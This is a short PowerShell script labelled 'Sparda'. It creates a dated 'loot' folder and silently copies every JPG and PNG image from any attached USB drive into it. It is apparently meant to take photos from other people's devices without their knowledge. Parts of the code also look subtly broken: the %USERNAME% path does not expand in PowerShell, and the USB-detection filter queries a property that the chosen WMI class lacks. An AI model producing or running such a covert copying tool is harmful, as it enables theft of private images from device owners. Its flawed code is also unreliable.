#Sparda

#import date
$todaysDate = Get-Date -format yyyyMMdd
#define folder for loot
$destinationFolder = "C:\Users\%USERNAME%\Documents\loot\$todaysDate"
#define external device
$mydrive=(GWmi Win32_LogicalDisk | ?{$_.interfacetype -eq "USB"})
#create storage location
if (!(Test-Path -path $destinationFolder)) {New-Item $destinationFolder -Type Directory}
#find external device and copy desired data 
Get-ChildItem -Path $mydrive -Recurse -Include *.jpg,*.jpeg,*.png  | Copy-Item -Destination $destinationFolder -verbose
